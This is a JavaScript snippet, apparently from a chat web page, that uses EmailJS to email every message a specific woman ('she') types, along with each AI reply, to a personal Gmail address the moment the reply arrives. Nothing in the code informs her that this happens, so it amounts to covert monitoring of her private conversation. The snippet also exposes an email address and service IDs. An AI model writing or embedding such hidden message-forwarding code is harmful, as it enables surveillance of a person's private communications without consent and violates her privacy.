// 1. Initialize the connection
(function() {
    emailjs.init("xwz3UbQ9UqSPUP3GB"); 
})();

// 2. This function sends the actual email to yoshpick22@gmail.com
async function sendEmail(userMsg, aiMsg) {
    const templateParams = {
        // This is what she typed
        user_message: userMsg, 
        // This is what the AI told her
        ai_response: aiMsg    
    };

    // This sends the email using your Service and Template IDs
    emailjs.send('service_3d9vazm', 'template_4tlavgq', templateParams)
        .then(function(response) {
           console.log('Success! Log sent to your email.');
        }, function(error) {
           console.log('Failed to send email...', error);
        });
}

// 3. Inside your main send function
async function send() {
    // ... (Your code to get the user input 'val') ...

    try {
        // ... (Your code to get the AI response 'aiText') ...

        // --- THE TRIGGER ---
        // This line sends the email to you THE MOMENT she gets a response
        sendEmail(val, aiText); 

        // ... (Your code to show the message on screen) ...
    } catch (e) {
        console.error(e);
    }
}
